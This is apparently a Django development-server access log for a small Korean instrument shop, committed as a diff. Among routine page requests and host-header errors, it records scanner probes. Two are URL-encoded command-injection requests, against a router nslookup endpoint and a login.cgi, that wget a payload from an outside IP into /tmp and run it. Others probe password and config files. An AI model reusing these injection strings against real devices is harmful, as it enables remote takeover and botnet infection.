+Bad Request: /
+[15/Aug/2018 05:39:37] "GET / HTTP/1.1" 400 59221
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 06:16:55] "GET / HTTP/1.1" 400 59354
+[15/Aug/2018 06:17:14] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 06:17:23] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 07:21:22] "GET / HTTP/1.1" 400 58769
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 07:30:18] "GET / HTTP/1.1" 400 58767
+[15/Aug/2018 08:46:05] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 08:46:05] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: 'www.baidu.com'. You may need to add 'www.baidu.com' to ALLOWED_HOSTS.
+Bad Request: /http:/www.baidu.com/cache/global/img/gs.gif
+[15/Aug/2018 09:00:56] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 400 59253
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 09:51:27] "HEAD / HTTP/1.1" 400 58499
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 10:08:51] "GET / HTTP/1.1" 400 59046
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 10:43:54] "GET / HTTP/1.1" 400 59354
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 11:03:08] "GET / HTTP/1.1" 400 58769
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 11:13:15] "GET / HTTP/1.1" 400 58775
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 11:55:57] "GET / HTTP/1.1" 400 59326
+Not Found: /cgi-bin/luci/;stok=redacted/expert/maintenance/diagnostic/nslookup
+[15/Aug/2018 11:56:17] "GET /cgi-bin/luci/;stok=redacted/expert/maintenance/diagnostic/nslookup?nslookup_button=nslookup_button&ping_ip=google.ca%20%3B%20cd%20/tmp%3Bwget%20http://178.128.11.199/rvs%20-O%20/tmp/rz%3Bchmod%20777%20/tmp/rz%3Bsh%20/tmp/rz%20 HTTP/1.0" 404 5952
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /ccvv
+[15/Aug/2018 12:13:52] "GET /ccvv HTTP/1.1" 400 58847
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 12:27:14] "GET / HTTP/1.1" 400 59156
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 12:32:40] "GET / HTTP/1.1" 400 58769
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 12:32:43] "GET / HTTP/1.1" 400 59506
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 12:45:25] "GET / HTTP/1.1" 400 58995
+[15/Aug/2018 12:50:46] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 12:51:05] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[15/Aug/2018 13:11:38] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 13:11:38] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 13:43:19] "GET / HTTP/1.1" 400 58770
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 14:13:03] "GET / HTTP/1.1" 400 58777
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 14:28:11] "GET / HTTP/1.1" 400 59339
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.5/dist-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 14:40:50] "GET / HTTP/1.1" 400 58767
+[15/Aug/2018 15:03:21] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 15:03:29] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 15:09:00] "GET / HTTP/1.1" 400 59354
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 15:11:05] "GET / HTTP/1.1" 400 58890
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 15:15:12] "GET / HTTP/1.1" 400 59713
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120-precomposed.png
+[15/Aug/2018 15:15:12] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 400 59722
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120.png
+[15/Aug/2018 15:15:12] "GET /apple-touch-icon-120x120.png HTTP/1.1" 400 59590
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-precomposed.png
+[15/Aug/2018 15:15:12] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 400 59634
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon.png
+[15/Aug/2018 15:15:12] "GET /apple-touch-icon.png HTTP/1.1" 400 59502
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[15/Aug/2018 15:15:12] "GET /favicon.ico HTTP/1.1" 400 59403
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120-precomposed.png
+[15/Aug/2018 15:15:12] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 400 59722
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120.png
+[15/Aug/2018 15:15:12] "GET /apple-touch-icon-120x120.png HTTP/1.1" 400 59590
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-precomposed.png
+[15/Aug/2018 15:15:12] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 400 59634
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon.png
+[15/Aug/2018 15:15:13] "GET /apple-touch-icon.png HTTP/1.1" 400 59502
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[15/Aug/2018 15:15:13] "GET /favicon.ico HTTP/1.1" 400 59403
+Not Found: /qnfxcjqr
+[15/Aug/2018 15:19:14] "GET /qnfxcjqr HTTP/1.1" 404 5610
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /currentsetting.htm
+[15/Aug/2018 15:19:17] "GET /currentsetting.htm HTTP/1.1" 400 58826
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 15:19:22] "GET / HTTP/1.1" 400 58628
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /winbox.png
+[15/Aug/2018 15:19:25] "GET /winbox.png HTTP/1.1" 400 58738
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /login.html
+[15/Aug/2018 15:19:30] "GET /login.html HTTP/1.1" 400 58739
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /device_description.xml
+[15/Aug/2018 15:19:31] "GET /device_description.xml HTTP/1.1" 400 58871
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/user/Config.cgi
+[15/Aug/2018 15:19:32] "GET /cgi-bin/user/Config.cgi?.cab&action=get&category=Account.* HTTP/1.1" 400 59727
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /current_config/passwd
+[15/Aug/2018 15:19:33] "GET /current_config/passwd HTTP/1.1" 400 58860
+Not Found: /robots.txt
+[15/Aug/2018 15:25:55] "GET /robots.txt HTTP/1.1" 404 5616
+[15/Aug/2018 15:25:59] "GET /products/ HTTP/1.1" 200 12020
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 15:27:04] "GET / HTTP/1.1" 400 58994
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 16:01:06] "GET / HTTP/1.1" 400 59713
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120-precomposed.png
+[15/Aug/2018 16:01:06] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 400 59722
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120.png
+[15/Aug/2018 16:01:07] "GET /apple-touch-icon-120x120.png HTTP/1.1" 400 59590
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-precomposed.png
+[15/Aug/2018 16:01:07] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 400 59634
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon.png
+[15/Aug/2018 16:01:07] "GET /apple-touch-icon.png HTTP/1.1" 400 59502
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[15/Aug/2018 16:01:07] "GET /favicon.ico HTTP/1.1" 400 59403
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120-precomposed.png
+[15/Aug/2018 16:01:07] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 400 59722
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120.png
+[15/Aug/2018 16:01:07] "GET /apple-touch-icon-120x120.png HTTP/1.1" 400 59590
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-precomposed.png
+[15/Aug/2018 16:01:07] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 400 59634
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon.png
+[15/Aug/2018 16:01:07] "GET /apple-touch-icon.png HTTP/1.1" 400 59502
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[15/Aug/2018 16:01:07] "GET /favicon.ico HTTP/1.1" 400 59403
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 16:15:29] "GET / HTTP/1.1" 400 58924
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 16:27:20] "GET / HTTP/1.1" 400 59318
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[15/Aug/2018 16:31:53] "GET /robots.txt HTTP/1.1" 400 59270
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 16:31:55] "GET / HTTP/1.1" 400 59160
+[15/Aug/2018 16:49:00] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 16:49:02] "GET /static/shop/css/home.css HTTP/1.1" 304 0
+[15/Aug/2018 16:49:02] "GET /static/shop/js/javascript.js HTTP/1.1" 304 0
+[15/Aug/2018 16:51:16] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 16:52:08] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 16:52:09] "GET /static/shop/css/home.css HTTP/1.1" 200 6133
+[15/Aug/2018 16:52:09] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[15/Aug/2018 16:52:09] "GET /static/shop/assets/logo.png HTTP/1.1" 200 12947
+[15/Aug/2018 16:52:09] "GET /static/shop/assets/buttonLeft.png HTTP/1.1" 200 1972
+[15/Aug/2018 16:52:09] "GET /static/shop/assets/buttonRight.png HTTP/1.1" 200 1949
+[15/Aug/2018 16:52:09] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_25%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 200 286720
+[15/Aug/2018 16:52:09] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_18%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_250.png HTTP/1.1" 200 253952
+[15/Aug/2018 16:52:09] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_60.png HTTP/1.1" 200 180224
+[15/Aug/2018 16:52:09] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_150.png HTTP/1.1" 200 180224
+[15/Aug/2018 16:52:09] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 200 253952
+Not Found: /favicon.ico
+[15/Aug/2018 16:52:09] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%96%91%EA%B8%88250.png HTTP/1.1" 200 180224
+[15/Aug/2018 16:52:09] "GET /favicon.ico HTTP/1.1" 404 5619
+Not Found: /login.cgi
+[15/Aug/2018 17:13:36] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.67.245/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 404 5712
+[15/Aug/2018 17:15:22] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 17:15:34] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 17:15:43] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[15/Aug/2018 17:36:27] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 17:36:27] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 17:37:25] "GET / HTTP/1.1" 400 58769
+[15/Aug/2018 17:47:39] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 17:47:39] "GET /static/shop/css/home.css HTTP/1.1" 304 0
+[15/Aug/2018 17:47:39] "GET /static/shop/js/javascript.js HTTP/1.1" 304 0
+[15/Aug/2018 17:47:39] "GET /static/shop/assets/buttonRight.png HTTP/1.1" 304 0
+[15/Aug/2018 17:47:39] "GET /static/shop/assets/logo.png HTTP/1.1" 200 12947
+[15/Aug/2018 17:47:40] "GET /static/shop/assets/buttonLeft.png HTTP/1.1" 304 0
+[15/Aug/2018 17:47:41] "GET /static/shop/assets/banner1.png HTTP/1.1" 304 0
+[15/Aug/2018 17:47:42] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_150.png HTTP/1.1" 200 962166
+[15/Aug/2018 17:47:42] "GET /accounts/login/ HTTP/1.1" 200 3095
+[15/Aug/2018 17:47:43] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_25%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 200 614400
+[15/Aug/2018 17:47:43] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 200 999424
+[15/Aug/2018 17:47:43] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%96%91%EA%B8%88250.png HTTP/1.1" 200 1097728
+[15/Aug/2018 17:47:43] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_60.png HTTP/1.1" 200 393216
+[15/Aug/2018 17:47:43] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_18%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_250.png HTTP/1.1" 200 1122304
+[15/Aug/2018 17:47:43] "GET /static/shop/css/login.css HTTP/1.1" 304 0
+[15/Aug/2018 17:47:51] "POST /accounts/login/ HTTP/1.1" 200 3417
+[15/Aug/2018 17:47:54] "GET /accounts/signup/ HTTP/1.1" 200 4804
+[15/Aug/2018 17:48:11] "GET /accounts/login/ HTTP/1.1" 200 3095
+[15/Aug/2018 17:48:13] "POST /accounts/login/ HTTP/1.1" 200 3420
+[15/Aug/2018 17:48:27] "POST /accounts/login/ HTTP/1.1" 200 3420
+[15/Aug/2018 17:48:30] "GET /accounts/signup/ HTTP/1.1" 200 4804
+[15/Aug/2018 17:48:34] "POST /idCheck/ HTTP/1.1" 200 19
+[15/Aug/2018 17:48:43] "POST /accounts/signup/ HTTP/1.1" 200 5291
+[15/Aug/2018 17:48:54] "POST /idCheck/ HTTP/1.1" 200 19
+[15/Aug/2018 17:49:07] "POST /accounts/signup/ HTTP/1.1" 302 0
+[15/Aug/2018 17:49:08] "GET /accounts/login/done/ HTTP/1.1" 200 1708
+[15/Aug/2018 17:49:11] "GET /accounts/login/ HTTP/1.1" 200 3095
+[15/Aug/2018 17:49:17] "POST /accounts/login/ HTTP/1.1" 200 3422
+[15/Aug/2018 17:49:22] "POST /accounts/login/ HTTP/1.1" 302 0
+[15/Aug/2018 17:49:22] "GET / HTTP/1.1" 200 6392
+[15/Aug/2018 17:49:23] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_60.png HTTP/1.1" 200 951536
+[15/Aug/2018 17:49:26] "GET /mypage/ HTTP/1.1" 200 3954
+[15/Aug/2018 17:49:26] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%96%91%EA%B8%88250.png HTTP/1.1" 200 1662976
+[15/Aug/2018 17:49:26] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0_%EC%95%88%EC%A1%B115.png HTTP/1.1" 304 0
+[15/Aug/2018 17:49:26] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 200 1589248
+[15/Aug/2018 17:49:26] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0_%EB%AA%85%EC%A3%BC%EC%8B%A430.png HTTP/1.1" 200 1335296
+[15/Aug/2018 17:49:26] "GET /static/shop/css/product.css HTTP/1.1" 304 0
+[15/Aug/2018 17:49:26] "GET /static/shop/css/intro.css HTTP/1.1" 304 0
+[15/Aug/2018 17:49:26] "GET /static/shop/css/productD.css HTTP/1.1" 200 2371
+[15/Aug/2018 17:49:26] "GET /static/shop/css/mypage.css HTTP/1.1" 200 7231
+[15/Aug/2018 17:49:29] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_18%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_250.png HTTP/1.1" 200 1581056
+[15/Aug/2018 17:49:30] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_25%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 200 1449984
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 13, 2018 - 19:57:49
+Django version 2.1, using settings 'e_commerce.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+----------------------------------------
+Exception happened during processing of request from ('211.56.250.130', 51279)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('58.241.211.123', 5024)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('84.30.192.143', 6595)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('211.56.250.130', 60342)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('59.21.218.179', 56203)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('211.56.250.130', 57258)
+----------------------------------------
+<tr><th><label for="id_username">사용자 이름:</label></th><td><input type="text" name="username" value="thisistest" required id="id_username" maxlength="150" autofocus><br><span class="helptext">150자 이하 문자, 숫자 그리고 @/./+/-/_만 가능합니다.</span></td></tr>
+<tr><th><label for="id_email">Email:</label></th><td><input type="email" name="email" value="email@email.com" id="id_email" required></td></tr>
+<tr><th><label for="id_password1">비밀번호:</label></th><td><input type="password" name="password1" id="id_password1" required><br><span class="helptext"><ul><li>다른 개인정보와 비슷한 비밀번호는 사용할 수 없습니다.</li><li>비밀번호는 최소 8자 이상이어야 합니다.</li><li>비밀번호는 일상적으로 사용되는 비밀번호일 수 없습니다.</li><li>비밀번호는 전부 숫자로 할 수 없습니다.</li></ul></span></td></tr>
+<tr><th><label for="id_password2">비밀번호 확인:</label></th><td><input type="password" name="password2" id="id_password2" required><br><span class="helptext">확인을 위해 이전과 동일한 비밀번호를 입력하세요. </span></td></tr>
+<HttpResponseRedirect status_code=302, "text/html; charset=utf-8", url="/accounts/login/done/">
+HERE
+Performing system checks...
+
+System check identified no issues (0 silenced).
+
+You have 20 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions, shop.
+Run 'python manage.py migrate' to apply them.
+August 15, 2018 - 17:50:45
+Django version 2.1, using settings 'e_commerce.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+
+You have 20 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions, shop.
+Run 'python manage.py migrate' to apply them.
+August 15, 2018 - 17:50:51
+Django version 2.1, using settings 'e_commerce.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+[15/Aug/2018 17:51:46] "GET /mypage/ HTTP/1.1" 200 4029
+[15/Aug/2018 17:51:50] "GET /products/ HTTP/1.1" 200 12285
+[15/Aug/2018 17:51:50] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%A0%95%EC%95%85_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 304 0
+[15/Aug/2018 17:51:50] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_60.png HTTP/1.1" 304 0
+[15/Aug/2018 17:51:50] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 304 0
+[15/Aug/2018 17:51:53] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%A0%95%EC%95%85_%EA%B0%80%EC%95%BC%EA%B8%88_300_ASLaGNj.png HTTP/1.1" 304 0
+[15/Aug/2018 17:51:53] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EA%B1%B0%EB%AC%B8%EA%B3%A0300.png HTTP/1.1" 304 0
+[15/Aug/2018 17:51:53] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EA%B1%B0%EB%AC%B8%EA%B3%A0500.png HTTP/1.1" 304 0
+[15/Aug/2018 17:51:54] "GET /mypage/order/ HTTP/1.1" 200 2863
+[15/Aug/2018 17:51:54] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EC%95%84%EC%9F%81.png HTTP/1.1" 304 0
+[15/Aug/2018 17:51:54] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EA%B1%B0%EB%AC%B8%EA%B3%A0800.png HTTP/1.1" 304 0
+[15/Aug/2018 17:51:54] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 200 1581056
+[15/Aug/2018 17:51:54] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_25%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 200 1662976
+[15/Aug/2018 17:51:54] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_18%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_250.png HTTP/1.1" 200 1728512
+[15/Aug/2018 17:51:56] "GET /mypage/cart/ HTTP/1.1" 200 2657
+[15/Aug/2018 17:51:59] "GET /products/ HTTP/1.1" 200 12285
+[15/Aug/2018 17:52:02] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_300.png HTTP/1.1" 304 0
+[15/Aug/2018 17:52:03] "GET /products/5/ HTTP/1.1" 200 4767
+[15/Aug/2018 17:52:03] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_25%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 200 606208
+[15/Aug/2018 17:52:03] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%96%91%EA%B8%88250.png HTTP/1.1" 200 475136
